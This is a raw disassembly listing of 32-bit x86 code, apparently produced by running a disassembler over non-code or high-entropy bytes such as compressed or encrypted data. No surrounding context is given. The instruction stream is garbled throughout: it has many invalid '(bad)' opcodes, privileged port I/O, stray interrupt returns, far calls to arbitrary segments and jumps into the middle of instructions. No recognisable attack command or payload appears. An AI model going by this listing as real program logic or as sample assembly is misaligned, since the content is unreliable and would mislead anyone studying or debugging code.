  41d3bd:	push   es
  41d3be:	lea    esi,[esi]
  41d3c0:	or     BYTE PTR [edi-0x9e51ce6],0xd0
  41d3c7:	xlat   BYTE PTR ds:[ebx]
  41d3c8:	mov    bl,0xff
  41d3ca:	cld    
  41d3cb:	out    0x48,eax
  41d3cd:	(bad)  
  41d3cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3d0:	sub    al,0xc2
  41d3d2:	push   edx
  41d3d3:	popa   
  41d3d4:	clc    
  41d3d5:	out    0xdd,al
  41d3d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3d8:	loopne 0x41d373
  41d3da:	lods   eax,DWORD PTR ds:[esi]
  41d3db:	shl    BYTE PTR [edi+0x6b],0x39
  41d3df:	daa    
  41d3e0:	jle    0x41d3f5
  41d3e2:	cld    
  41d3e3:	cmp    bl,BYTE PTR [esp+eax*4]
  41d3e6:	dec    esi
  41d3e7:	mov    bh,0x1c
  41d3e9:	pushf  
  41d3ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3eb:	stc    
  41d3ec:	xor    DWORD PTR [esi+0x57d4f74b],esp
  41d3f2:	cmp    ah,BYTE PTR [ebx-0x6abc4de0]
  41d3f8:	out    0x8a,eax
  41d3fa:	ja     0x41d46d
  41d3fc:	test   BYTE PTR [edx+eax*1-0xf],dl
  41d400:	xor    BYTE PTR [ecx-0x51],cl
  41d403:	jae    0x41d475
  41d405:	inc    ebp
  41d406:	sub    eax,0xfd1fef7f
  41d40b:	mov    ah,BYTE PTR [eax]
  41d40d:	jnp    0x41d41c
  41d40f:	rcl    BYTE PTR [edi-0x34],1
  41d412:	sub    al,0xeb
  41d414:	jmp    0x41d3a5
  41d416:	(bad)  
  41d417:	jmp    0x41d3c7
  41d419:	pushf  
  41d41a:	lea    ecx,[ebp-0x44]
  41d41d:	(bad)  
  41d41e:	pushf  
  41d41f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d420:	xchg   esp,eax
  41d421:	dec    ebx
  41d422:	(bad)  
  41d423:	test   cl,0xd6
  41d426:	shr    esp,1
  41d428:	shl    al,1
  41d42a:	popf   
  41d42b:	stos   BYTE PTR es:[edi],al
  41d42c:	mov    dl,dl
  41d42e:	out    0xe8,eax
  41d430:	sbb    eax,0xece27744
  41d435:	shl    DWORD PTR [eax-0x4688d39b],1
  41d43b:	push   ss
  41d43c:	inc    edx
  41d43d:	xchg   DWORD PTR [ecx+eiz*2],esp
  41d440:	mov    ds:0x26b90fae,eax
  41d445:	iret   
  41d446:	pop    esp
  41d447:	push   0x8e4f0c79
  41d44c:	sub    dl,BYTE PTR [ecx-0xd]
  41d44f:	in     al,0xab
  41d451:	or     esi,esp
  41d453:	mov    edi,0x68a54c3a
  41d458:	mov    ebp,0xc068ac9d
  41d45d:	lods   eax,DWORD PTR ds:[esi]
  41d45e:	pop    edx
  41d45f:	mov    esi,0x7c7807f6
  41d464:	mov    al,BYTE PTR [eax-0x3fbf5188]
  41d46a:	leave  
  41d46b:	push   esp
  41d46c:	push   0xffffffcd
  41d46e:	inc    edi
  41d46f:	and    DWORD PTR [esi-0x129496c],esp
  41d475:	sbb    BYTE PTR [edi],dl
  41d477:	fbstp  TBYTE PTR [edx]
  41d479:	fild   DWORD PTR [edx+0x62]
  41d47c:	scas   al,BYTE PTR es:[edi]
  41d47d:	add    al,0xf3
  41d47f:	or     al,0x53
  41d481:	fdivr  QWORD PTR [edx]
  41d483:	and    ebx,0x3a
  41d486:	and    BYTE PTR [ebp+0x3c169ff1],0x5
  41d48d:	iret   
  41d48e:	bound  esp,QWORD PTR [esi]
  41d490:	xchg   ebp,eax
  41d491:	arpl   dx,dx
  41d493:	int3   
  41d494:	in     eax,dx
  41d495:	inc    ebx
  41d496:	or     ch,ah
  41d498:	pop    ebp
  41d499:	daa    
  41d49a:	jecxz  0x41d484
  41d49c:	stos   BYTE PTR es:[edi],al
  41d49d:	mov    bh,0x6d
  41d49f:	mov    eax,0x475742d0
  41d4a4:	dec    ebp
  41d4a5:	(bad)  
  41d4a6:	ins    DWORD PTR es:[edi],dx
  41d4a7:	repz pop esi
  41d4a9:	mov    edx,0x4612dc62
  41d4ae:	add    eax,0x208925d1
  41d4b3:	nop
  41d4b4:	and    esi,edx
  41d4b6:	clc    
  41d4b7:	push   cs
  41d4b8:	mov    bh,0xc6
  41d4ba:	cmp    BYTE PTR [ecx-0x12],ch
  41d4bd:	mov    bl,0x68
  41d4bf:	xor    ebx,ebp
  41d4c1:	inc    edx
  41d4c2:	repz loop 0x41d496
  41d4c5:	ret    
  41d4c6:	and    ebx,DWORD PTR [edx]
  41d4c8:	imul   ecx,ebx,0x768f38b
  41d4ce:	sub    bl,BYTE PTR [eax+0x770dfbd3]
  41d4d4:	daa    
  41d4d5:	test   BYTE PTR [esi-0x32],0x7d
  41d4d9:	mov    ecx,0x39becba4
  41d4de:	inc    esi
  41d4df:	in     eax,0x7e
  41d4e1:	(bad)  
  41d4e2:	sub    eax,edi
  41d4e4:	mov    dh,0xdd
  41d4e6:	out    dx,al
  41d4e7:	imul   edi,DWORD PTR [edx+0x7a],0xffffff9a
  41d4eb:	addr16 call 0xb0b9811c
  41d4f1:	pop    ecx
  41d4f2:	push   ecx
  41d4f3:	mov    edx,ebp
  41d4f5:	push   ecx
  41d4f6:	pop    ebx
  41d4f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4f8:	mov    edx,0x7e5caae4
  41d4fd:	stos   DWORD PTR es:[edi],eax
  41d4fe:	jne    0x41d4cc
  41d500:	pop    esi
  41d501:	out    dx,eax
  41d502:	mov    edi,0xf06a14fb
  41d507:	aaa    
  41d508:	push   ds
  41d509:	pop    ds
  41d50a:	iret   
  41d50b:	fimul  DWORD PTR [ebx-0x65d64ccb]
  41d511:	outs   dx,BYTE PTR ds:[esi]
  41d512:	fdivrp st(4),st
  41d514:	(bad)  
  41d515:	and    eax,DWORD PTR [esi*1+0x4a993e34]
  41d51c:	or     esp,DWORD PTR [ebx+0xba050e1]
  41d522:	jb     0x41d514
  41d524:	sub    esp,DWORD PTR [ebx-0x59]
  41d527:	in     al,0x8f
  41d529:	sub    DWORD PTR [ebx+0x5b],ebx
  41d52c:	sbb    ch,BYTE PTR [ecx+0xc6d5bda]
  41d532:	cmp    eax,0xc704b651
  41d537:	fld    QWORD PTR ds:0x5e1c0a50
  41d53d:	mov    WORD PTR [ebx],ss
  41d53f:	out    0xf4,eax
  41d541:	dec    esp
  41d542:	mov    bh,0x41
  41d544:	cmp    BYTE PTR [ecx-0x4d],dl
  41d547:	xchg   esi,eax
  41d548:	cmp    DWORD PTR [edx],eax
  41d54a:	jbe    0x41d55d
  41d54c:	(bad)  
  41d54e:	hlt    
  41d54f:	sbb    eax,0xcddcdf88
  41d554:	repz in eax,dx
  41d556:	adc    ebp,DWORD PTR [eax+0x2e562132]
  41d55c:	jb     0x41d57e
  41d55e:	test   DWORD PTR [esi+0x4ba730c5],edi
  41d564:	aaa    
  41d565:	addr16 inc edi
  41d567:	arpl   WORD PTR [esp+edi*1],ax
  41d56a:	jae    0x41d540
  41d56c:	(bad)
  41d570:	test   al,cl
  41d572:	in     al,dx
  41d573:	sti    
  41d574:	test   DWORD PTR [eax],ecx
  41d576:	mov    cl,BYTE PTR [ebp+0x74c81baa]
  41d57c:	fild   QWORD PTR [edi-0x565bd081]
  41d582:	and    bh,BYTE PTR [edi+0x45290ed6]
  41d588:	cmp    ah,bh
  41d58a:	xchg   esi,eax
  41d58b:	mov    bh,0x21
  41d58d:	mov    edi,0x907c5e05
  41d592:	pop    esp
  41d593:	test   BYTE PTR [ecx+0x67],al
  41d596:	push   edi
  41d597:	popa   
  41d598:	iret   
  41d599:	shr    BYTE PTR [esi-0x26],0xf6
  41d59d:	out    dx,eax
  41d59e:	std    
  41d59f:	shl    DWORD PTR [edx],1
  41d5a1:	push   ebp
  41d5a2:	jo     0x41d58f
  41d5a4:	jge    0x41d5be
  41d5a6:	lock mov edi,0xdd5a5319
  41d5ac:	inc    ebx
  41d5ad:	mov    ch,0x3a
  41d5af:	xchg   ebx,eax
  41d5b0:	sbb    al,0x21
  41d5b2:	je     0x41d5ad
  41d5b4:	fsubrp st(3),st
  41d5b6:	sub    BYTE PTR [ebp+0x2],0xce
  41d5ba:	mov    cl,0xe1
  41d5bc:	(bad)  
  41d5be:	fst    QWORD PTR [esp+eax*2]
  41d5c1:	add    DWORD PTR [eax-0x5e],ecx
  41d5c4:	or     eax,0xef554f95
  41d5c9:	jle    0x41d647
  41d5cb:	shr    BYTE PTR [edx],0xfd
  41d5ce:	xchg   ebx,eax
  41d5cf:	lds    esp,FWORD PTR [esi+0x5250c1bc]
  41d5d5:	add    ebp,ebx
  41d5d7:	loop   0x41d5c2
  41d5d9:	in     al,0x95
  41d5db:	push   ds
  41d5dc:	call   0xa3fe:0x9dacc241
  41d5e3:	cmp    al,0x6d
  41d5e5:	add    DWORD PTR [ebx+0x53],0xffffffff
  41d5e9:	add    al,0x6
  41d5eb:	scas   eax,DWORD PTR es:[edi]
  41d5ec:	outs   dx,BYTE PTR ds:[esi]
  41d5ed:	pop    ecx
  41d5ee:	rol    cl,1
  41d5f0:	in     al,0x2c
  41d5f2:	inc    edx
  41d5f3:	call   0x336f3e2
  41d5f8:	pop    esi
  41d5f9:	out    dx,al
  41d5fa:	dec    ebx
  41d5fb:	xor    DWORD PTR [ebx],ecx
  41d5fd:	das    
  41d5fe:	iret   
  41d5ff:	je     0x41d5d5
  41d601:	sahf   
  41d602:	jae    0x41d65a
  41d604:	xor    al,0x31
  41d606:	xchg   edi,eax
  41d607:	clc    
  41d608:	loope  0x41d615
  41d60a:	sub    DWORD PTR [edi+eiz*2-0x65f3635],edx
  41d611:	jno    0x41d5c8
  41d613:	xchg   ecx,eax
  41d614:	ret    
  41d615:	xor    al,0xf5
  41d617:	ss mov ebp,0xafcd1bdc
  41d61d:	xchg   ecx,eax
  41d61e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d61f:	je     0x41d676
  41d621:	(bad)  
  41d623:	mov    edi,0x2517865e
  41d628:	aad    0xce
  41d62a:	push   ebx
  41d62b:	xor    al,0x73
  41d62d:	push   0x912818eb
  41d632:	add    BYTE PTR [ebx],0x76
  41d635:	sub    eax,eax
  41d637:	mov    ebx,0xb5151cdc
  41d63c:	sbb    eax,0x170a7479
  41d641:	mov    eax,0x292c6970
  41d646:	xor    al,0x74
  41d648:	add    esp,DWORD PTR [eax]
  41d64a:	stc    
  41d64b:	mov    cl,0x48
  41d64d:	shl    ch,1
  41d64f:	inc    ebp
  41d650:	es jno 0x41d5e8
  41d653:	cdq    
  41d654:	je     0x41d655
  41d656:	and    DWORD PTR [ecx-0x4],0x5e
  41d65a:	sub    eax,0x40388114
  41d65f:	lock push cs
  41d661:	in     eax,dx
  41d662:	repz mov bh,BYTE PTR [ebx-0x4ebf6f11]
  41d669:	dec    edx
  41d66a:	adc    al,0xe7
  41d66c:	xchg   edx,eax
  41d66d:	mov    ds:0xfef5fa30,eax
  41d672:	mov    ecx,0x612253f3
  41d677:	inc    eax
  41d678:	retf   
  41d679:	rcr    DWORD PTR [ebp-0x22],0xf2
  41d67d:	xor    dl,ch
  41d67f:	aam    0xf3
  41d681:	and    eax,0x261013fc
  41d686:	test   dl,0xc9
  41d689:	xor    cl,BYTE PTR ds:0x43d9f1c8
  41d68f:	pop    esi
  41d690:	jg     0x41d701
  41d692:	push   ecx
  41d693:	sahf   
  41d694:	daa    
  41d695:	dec    eax
  41d696:	iret   
  41d697:	mov    ?,WORD PTR [ecx-0x54]
  41d69a:	rol    BYTE PTR [esi+edx*2+0x19],0x4f
  41d69f:	jg     0x41d69a
  41d6a1:	jmp    0x41d6c4
  41d6a3:	xchg   esp,eax
  41d6a4:	or     al,BYTE PTR [edx-0x4c16da84]
  41d6aa:	(bad)  
  41d6ac:	xchg   ebx,eax
  41d6ad:	pop    ss
  41d6ae:	add    dl,dh
  41d6b0:	call   0x8eb9:0xcfd2d580
  41d6b7:	jns    0x41d6df
  41d6b9:	imul   edi,DWORD PTR [edi],0x142fee08
  41d6bf:	(bad)  
  41d6c1:	cmp    eax,0x9fabf844
  41d6c6:	icebp  
  41d6c7:	xchg   ebx,esi
  41d6c9:	ja     0x41d6d6
  41d6cb:	mov    edi,0xffcf16e9
  41d6d0:	inc    edx
  41d6d1:	fimul  DWORD PTR [ebx-0x26555e26]
  41d6d7:	inc    eax
  41d6d8:	inc    eax
  41d6d9:	jmp    0x41d756
  41d6db:	jnp    0x41d743
  41d6dd:	dec    ecx
  41d6de:	sbb    esi,DWORD PTR [edi]
  41d6e0:	adc    edx,ebx
  41d6e2:	mov    eax,0xfa99aae2
  41d6e7:	lahf   
  41d6e8:	and    eax,DWORD PTR [ecx+0x4d]
  41d6eb:	pushf  
  41d6ec:	push   ebx
  41d6ed:	dec    esi
  41d6ee:	imul   ebx,edx,0xffffff87
  41d6f1:	push   ebp
  41d6f2:	daa    
  41d6f3:	sbb    dh,ch
  41d6f5:	test   al,0x45
  41d6f7:	pop    ebx
  41d6f8:	ret    
  41d6f9:	fldcw  WORD PTR [edi-0x5a33023b]
  41d6ff:	mov    ebx,0xc6496fc6
  41d704:	iret   
  41d705:	jmp    ecx
  41d707:	pop    ebp
  41d708:	dec    eax
  41d709:	shr    DWORD PTR [ecx+0x46b0034d],1
  41d70f:	mov    ?,edx
  41d711:	out    dx,eax
  41d712:	inc    esp
  41d713:	outs   dx,BYTE PTR ds:[esi]
  41d714:	cmp    cl,BYTE PTR [edi]
  41d716:	mov    eax,ds:0x7636228a
  41d71b:	popa   
  41d71c:	icebp  
  41d71d:	sbb    ah,BYTE PTR [edx+0x4ee9e1f7]
  41d723:	mov    ch,0x18
  41d725:	lahf   
  41d726:	pop    esi
  41d727:	test   BYTE PTR [edi],dl
  41d729:	test   BYTE PTR [esi-0x5],ch
  41d72c:	sub    edx,DWORD PTR [ebp+0x2355f6ac]
  41d732:	cmp    ebx,ebx
  41d734:	in     al,dx
  41d735:	lods   al,BYTE PTR ds:[esi]
  41d736:	gs icebp 
  41d738:	mov    BYTE PTR [ecx],dh
  41d73a:	mov    dh,0x95
  41d73c:	hlt    
  41d73d:	add    ah,BYTE PTR ds:0xd60daefb
  41d743:	test   DWORD PTR [ecx-0x5],esi
  41d746:	pop    ds
  41d747:	stc    
  41d748:	mov    ds:0xf63d2b4f,eax
  41d74d:	test   al,0xfb
  41d74f:	jmp    0x41d750
  41d751:	retf   
  41d752:	pop    es
  41d753:	jp     0x41d7c3
  41d755:	out    0xec,eax
  41d757:	push   ds
  41d758:	cmp    esi,DWORD PTR ss:[ebx-0x449b2bba]
  41d75f:	shr    BYTE PTR [edx+0x79cd8724],1
  41d765:	sub    al,bl
  41d767:	jecxz  0x41d70a
  41d769:	(bad)  
  41d76a:	mov    eax,ds:0x5d6388e
  41d76f:	ret    
  41d770:	mov    cl,0x4a
  41d772:	mov    ?,ebx
  41d774:	fxtract 
  41d776:	ret    
  41d777:	jle    0x41d77f
  41d779:	mov    cl,0xbc
  41d77b:	arpl   bx,bp
  41d77d:	push   ds
  41d77e:	popa   
  41d77f:	push   ebx
  41d780:	pop    esp
  41d781:	mov    dl,0xa1
  41d783:	test   BYTE PTR [esi+0x453bea33],al
  41d789:	push   esp
  41d78a:	mov    dl,0x9a
  41d78c:	jb     0x41d7ab
  41d78e:	xor    dh,BYTE PTR [ebx]
  41d790:	les    eax,FWORD PTR [esi]
  41d792:	stc    
  41d793:	sbb    DWORD PTR [ebp-0x2c],ebp
  41d796:	ret    
  41d797:	pop    edi
  41d798:	sbb    ecx,esp
  41d79a:	fnstsw WORD PTR [ebp+0x68]
  41d79d:	ins    BYTE PTR es:[edi],dx
  41d79e:	add    DWORD PTR [edx],edi
  41d7a0:	out    dx,al
  41d7a1:	les    eax,FWORD PTR [eax-0x35336c58]
  41d7a7:	cmp    edx,DWORD PTR [ebx-0x1]
  41d7aa:	adc    ebp,DWORD PTR [ecx+eiz*2-0x4f]
  41d7ae:	adc    ebp,DWORD PTR [edx-0x80]
  41d7b1:	and    dh,BYTE PTR [ebx+0x132c4c5b]
  41d7b7:	repnz add eax,0x485eaf55
  41d7bd:	dec    eax
  41d7be:	jbe    0x41d7e5
  41d7c0:	mov    BYTE PTR [esi-0x5487f8c6],bl
  41d7c6:	dec    ebp
  41d7c7:	or     al,0x91
  41d7c9:	inc    ebx
  41d7ca:	pop    ss
  41d7cb:	arpl   WORD PTR [esi+0x1a],sp
  41d7ce:	jecxz  0x41d80e
  41d7d0:	or     eax,0x894aaaae
  41d7d5:	jmp    0x41d793
  41d7d7:	stos   DWORD PTR es:[edi],eax
  41d7d8:	xchg   BYTE PTR [ebp-0x80],dh
  41d7db:	std    
  41d7dc:	dec    ecx
  41d7dd:	aas    
  41d7de:	xor    edx,DWORD PTR [edx-0x11]
  41d7e1:	cmp    DWORD PTR [esi+0x78],edi
  41d7e4:	pop    ebp
  41d7e5:	sbb    DWORD PTR [ecx+eiz*4-0x2747aa2d],0x68
  41d7ed:	lods   eax,DWORD PTR ds:[esi]
  41d7ee:	dec    eax
  41d7ef:	mov    BYTE PTR [ebp-0x35df5c6c],dh
  41d7f5:	dec    edx
  41d7f6:	pop    ebp
  41d7f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7f8:	push   0xffffffec
  41d7fa:	mov    ?,WORD PTR [eax-0x62]
  41d7fd:	jle    0x41d7af
  41d7ff:	clc    
  41d800:	int    0xb8
  41d802:	sub    edx,DWORD PTR [ecx-0x6a]
  41d805:	fwait
  41d806:	inc    ebx
  41d807:	cmp    eax,0xc596ce02
  41d80c:	shl    edx,0x7d
  41d80f:	or     al,BYTE PTR [ebp+0x3f]
  41d812:	ins    BYTE PTR es:[edi],dx
  41d813:	leave  
  41d814:	gs xchg bl,dh
  41d817:	in     eax,0xe3
  41d819:	push   edi
  41d81a:	pop    esp
  41d81b:	push   ebx
  41d81c:	jge    0x41d7c2
  41d81e:	call   0x6214:0x5589b69d
  41d825:	xchg   edx,eax
  41d826:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d828:	stos   BYTE PTR es:[edi],al
  41d829:	mov    bh,0x2c
  41d82b:	sbb    BYTE PTR [edx+0x79],al
  41d82e:	or     al,0xa1
  41d830:	call   0x2021f977
  41d835:	lahf   
  41d836:	or     DWORD PTR [ebp-0x21847018],edi
  41d83c:	sbb    edx,DWORD PTR [esi]
  41d83e:	dec    ecx
  41d83f:	mov    ah,0xad
  41d841:	aam    0xd4
  41d843:	push   ebp
  41d844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d845:	in     al,dx
  41d846:	imul   eax,DWORD PTR [edx-0x2f6bd0f2],0x20
  41d84d:	popf   
  41d84e:	mov    eax,ds:0x89d0890a
  41d853:	dec    ebp
  41d854:	test   al,0x8b
  41d856:	dec    ebp
  41d857:	or     BYTE PTR [ebx-0x3e7e53ab],cl
  41d85d:	cwde   
  41d85e:	clc    
  41d85f:	fs add cl,ch
  41d862:	pop    edx
  41d863:	and    eax,DWORD PTR [eax]
  41d865:	add    BYTE PTR [ebp-0x7bf7fbfb],bl
  41d86b:	or     dl,BYTE PTR [ecx+0x589bd382]
  41d871:	in     al,dx
  41d872:	sub    eax,0xaf86a4d1
  41d877:	fstp   TBYTE PTR [ebx+eax*4+0x3d]
  41d87b:	pop    esi
  41d87c:	add    DWORD PTR [ebx+0x4eb7e8c1],0x79
  41d883:	sub    DWORD PTR [ecx+0x58],ebx
  41d886:	loop   0x41d883
  41d888:	xlat   BYTE PTR ds:[ebx]
  41d889:	mov    eax,0x4c193cd0
  41d88e:	xchg   edx,eax
  41d88f:	sub    BYTE PTR [eax+0x7a53c912],0x84
  41d896:	and    bl,BYTE PTR [edi+0x68]
  41d899:	imul   esp,DWORD PTR [ebx-0x42],0x8a8365a3
  41d8a0:	outs   dx,BYTE PTR ds:[esi]
  41d8a1:	fwait
  41d8a2:	jmp    0x41d882
  41d8a4:	scas   al,BYTE PTR es:[edi]
  41d8a5:	mov    ss,WORD PTR [edx]
  41d8a7:	stc    
  41d8a8:	mov    ecx,cs
  41d8aa:	stos   BYTE PTR es:[edi],al
  41d8ab:	pop    esp
  41d8ac:	ss mov al,0x57
  41d8af:	fisub  WORD PTR [ecx-0x42bf6bdc]
  41d8b5:	lds    esp,FWORD PTR [edx]
  41d8b7:	and    DWORD PTR [ebx],esp
  41d8b9:	mov    cl,0x29
  41d8bb:	pop    eax
  41d8bc:	mov    DWORD PTR [ecx+0x70],ebp
  41d8bf:	pop    ss
  41d8c0:	push   ecx
  41d8c1:	mov    eax,0x3a24fc32
  41d8c6:	nop
  41d8c7:	data16 icebp 
  41d8c9:	lods   al,BYTE PTR ds:[esi]
  41d8ca:	or     BYTE PTR [edi-0x28],0x76
  41d8ce:	pop    eax
  41d8cf:	adc    DWORD PTR [edi],ebx
  41d8d1:	pop    ds
  41d8d2:	mov    BYTE PTR [edi],dh
  41d8d4:	fwait
  41d8d5:	add    al,0x37
  41d8d7:	sbb    eax,0x49a17671
  41d8dc:	mov    bh,0xed
  41d8de:	and    dl,BYTE PTR [ecx]
  41d8e0:	push   0xc885aade
  41d8e5:	or     DWORD PTR [esi-0x3d],ebx
  41d8e8:	(bad)  
  41d8e9:	xchg   edx,eax
  41d8ea:	pop    ebp
  41d8eb:	and    eax,DWORD PTR [eax-0x3703427]
  41d8f1:	inc    esp
  41d8f2:	sub    eax,0x938c18d8
  41d8f7:	adc    esp,DWORD PTR cs:[edi]
  41d8fa:	and    edi,ebp
  41d8fc:	imul   esp,DWORD PTR [ebx+0x567a5139],0x2e2c9333
  41d906:	cmp    esi,esi
  41d908:	dec    esi
  41d909:	jmp    0x41d95a
  41d90b:	xacquire xchg DWORD PTR [esi],edx
  41d90e:	pop    ecx
  41d90f:	cli    
  41d910:	push   ds
  41d911:	jno    0x41d958
  41d913:	push   esp
  41d914:	std    
  41d915:	in     al,dx
  41d916:	shr    DWORD PTR [eax],1
  41d918:	cmovbe edx,DWORD PTR [eax+edi*1]
  41d91c:	jg     0x41d8be
  41d91e:	mov    eax,0x96f0b069
  41d923:	call   0xc3c02dbe
  41d928:	xchg   esi,eax
  41d929:	lds    ebx,FWORD PTR [esp+eax*2-0x1]
  41d92d:	mov    esp,0xaaa461e4
  41d932:	mov    al,0x53
  41d934:	clc    
  41d935:	dec    eax
  41d936:	mov    ds:0x71bdb62e,ax
  41d93c:	cmp    cl,BYTE PTR [eax+ebp*2]
  41d93f:	mov    eax,0x4e42f872
  41d944:	stos   BYTE PTR es:[edi],al
  41d945:	add    cl,dl
  41d947:	push   cs
  41d948:	jnp    0x41d8e4
  41d94a:	add    eax,0x643af8a0
  41d94f:	les    edx,FWORD PTR cs:[esi]
  41d952:	loopne 0x41d983
  41d954:	popa   
  41d955:	cdq    
  41d956:	or     eax,0x78c976e7
  41d95b:	test   eax,0x175d8aec
  41d960:	aad    0xa8
  41d962:	jne    0x41d8e9
  41d964:	adc    eax,0xb629e86f
  41d969:	lea    eax,[eax+0x2d]
  41d96c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d96d:	xchg   DWORD PTR [edx-0x69],ecx
  41d970:	inc    ebx
  41d971:	inc    edx
  41d972:	pop    esi
  41d973:	imul   eax,DWORD PTR [edi+eiz*1-0x2a],0xfffffff1
  41d978:	xchg   edx,eax
  41d979:	jae    0x41d978
  41d97b:	retf   
  41d97c:	push   ecx
  41d97d:	imul   edx,DWORD PTR [esi],0x1de61638
  41d983:	or     eax,0xd046b4c
  41d988:	add    eax,0x103bae24
  41d98d:	sub    bh,ch
  41d98f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d990:	and    BYTE PTR [esi+ecx*1-0x61f5e62a],ch
  41d997:	mov    ah,0x55
  41d999:	push   eax
  41d99a:	rcr    DWORD PTR [esi+0x17],cl
  41d99d:	sub    al,0x99
  41d99f:	not    cl
  41d9a1:	jp     0x41d971
  41d9a3:	pop    esp
  41d9a4:	sbb    DWORD PTR [ecx-0x6c0af230],edx
  41d9aa:	mov    ss,ebp
  41d9ac:	xor    al,0x4a
  41d9ae:	imul   edx,DWORD PTR [eax],0x5a3f84dc
  41d9b4:	cmp    al,0x8a
  41d9b6:	pop    ebx
  41d9b7:	sub    WORD PTR [ebx+ecx*8+0x7c],0x5a7f
  41d9be:	arpl   dx,bp
  41d9c0:	pop    esp
  41d9c1:	aad    0x5a
  41d9c3:	adc    BYTE PTR [ebx],ch
  41d9c5:	ret    0x7f77
  41d9c8:	dec    edx
  41d9c9:	sub    eax,0x8463c73e
  41d9ce:	jle    0x41d9a5
  41d9d0:	call   0x6fe4:0xc413f166
  41d9d7:	jne    0x41da03
  41d9d9:	cmp    eax,0xc7253163
  41d9de:	push   eax
  41d9df:	out    0x79,eax
  41d9e1:	retf   
  41d9e2:	pop    eax
  41d9e3:	je     0x41da0e
  41d9e5:	pop    edx
  41d9e6:	and    al,0xcf
  41d9e8:	pop    ds
  41d9e9:	and    ebp,DWORD PTR [ebp-0x6e]
  41d9ec:	jmp    0x9fdc:0xa84b614a
  41d9f3:	add    edx,0x49
  41d9f6:	mov    bh,0x6e
  41d9f8:	loope  0x41d9a8
  41d9fa:	mov    al,0xb4
  41d9fc:	mov    esi,0xa51aa99b
  41da01:	or     DWORD PTR [ecx],0x5b1f542a
  41da07:	lock fldenv [edx]
  41da0b:	cs jp  0x41d9fa
  41da0e:	ret    
  41da0f:	xor    DWORD PTR [ebx],ecx
  41da11:	and    BYTE PTR ss:[edi+0x7787fba7],0x89
  41da19:	int    0xa0
  41da1b:	xor    al,0x4b
  41da1d:	ret    
  41da1e:	shl    DWORD PTR [eax-0x72],cl
  41da21:	jne    0x41d9a6
  41da23:	ds push 0xd9b949c9
  41da29:	daa    
  41da2a:	cli    
  41da2b:	sbb    al,0xc3
  41da2d:	jp     0x41da72
  41da2f:	jae    0x41da4c
  41da31:	in     al,dx
  41da32:	div    DWORD PTR [edx-0x4b5d3b29]
  41da38:	mov    ecx,0x8df5d9bd
  41da3d:	jns    0x41d9db
  41da3f:	jmp    0x41da6d
  41da41:	pop    ecx
  41da42:	cld    
  41da43:	scas   eax,DWORD PTR es:[edi]
  41da44:	dec    ebx
  41da45:	fist   DWORD PTR [ecx-0x76]
  41da48:	dec    esi
  41da49:	xlat   BYTE PTR ds:[ebx]
  41da4a:	jle    0x41da3a
  41da4c:	lods   al,BYTE PTR ds:[esi]
  41da4d:	adc    DWORD PTR [ecx+ebp*8-0x63df2867],eax
  41da54:	ins    BYTE PTR es:[edi],dx
  41da55:	xor    eax,0x9790945c
  41da5a:	mov    esi,0x238e6bed
  41da5f:	push   ecx
  41da60:	ja     0x41da4c
  41da62:	stos   DWORD PTR es:[edi],eax
  41da63:	mov    eax,0xda40aa47
  41da68:	push   ss
  41da69:	je     0x41da8d
  41da6b:	push   ecx
  41da6c:	cmc    
  41da6d:	sbb    edi,DWORD PTR [ecx]
  41da6f:	push   cs
  41da70:	mov    ds:0x3ecf7133,al
  41da75:	fld    QWORD PTR [edx]
  41da77:	jmp    0x41daa6
  41da79:	dec    edi
  41da7a:	inc    ecx
  41da7b:	push   ss
  41da7c:	test   BYTE PTR [ebp+0x2cdaede4],cl
  41da82:	jb     0x41da4b
  41da84:	sbb    al,0x2c
  41da86:	jl     0x41da75
  41da88:	dec    edi
  41da89:	jmp    0xc07b:0x8636ebbc
  41da90:	and    BYTE PTR [edi],0x41
  41da93:	dec    edx
  41da94:	daa    
  41da95:	lock mov ecx,esi
  41da98:	imul   esi,DWORD PTR [ecx+0x2b97ca1e],0xffffffc4
  41da9f:	ins    DWORD PTR es:[edi],dx
  41daa0:	jg     0x41dae3
  41daa2:	jmp    0x41dac1
  41daa4:	jmp    0x41da30
  41daa6:	mov    DWORD PTR [eax+0x0],ebx
  41daa9:	dec    ecx
  41daaa:	leave  
  41daab:	xor    dl,BYTE PTR [esi]
  41daad:	fs stc 
  41daaf:	cmp    al,0xa3
  41dab1:	sub    eax,0xae501e76
  41dab6:	mov    BYTE PTR [ecx],bh
  41dab8:	icebp  
  41dab9:	outs   dx,DWORD PTR ds:[esi]
  41daba:	xchg   ecx,eax
  41dabb:	add    DWORD PTR [edi-0x4f],ecx
  41dabe:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dac0:	loop   0x41da4a
  41dac2:	fcom   QWORD PTR [ebp-0x4e]
  41dac5:	and    eax,0x31634b73
  41daca:	adc    BYTE PTR [ebp+0x3d9d4d69],dl
  41dad0:	in     al,dx
  41dad1:	test   al,0x65
  41dad3:	frstor [ebx-0x29ec1de1]
  41dad9:	add    eax,0x72f403a1
  41dade:	popf   
  41dadf:	inc    esi
  41dae0:	repnz pop edx
  41dae2:	add    eax,DWORD PTR [ebx]
  41dae4:	mov    dh,0x90
  41dae6:	add    DWORD PTR [ebx-0x33fd6db1],edx
  41daec:	mov    ah,BYTE PTR [edi-0x18]
  41daef:	mov    esp,0x684af2b0
  41daf4:	js     0x41daea
  41daf6:	pop    ss
  41daf7:	adc    eax,0x5e534787
  41dafc:	ins    BYTE PTR es:[edi],dx
  41dafd:	clc    
  41dafe:	in     al,dx
  41daff:	sahf   
  41db00:	xchg   edx,eax
  41db01:	jl     0x41db7f
  41db03:	inc    BYTE PTR [eax-0x4d]
  41db06:	mov    ebx,0xaa623e00
  41db0b:	mov    ecx,0x2b5cd5fd
  41db10:	push   ss
  41db11:	cmp    BYTE PTR [esi],bl
  41db13:	adc    DWORD PTR [esi-0x7e145767],esi
  41db19:	mov    dh,0x82
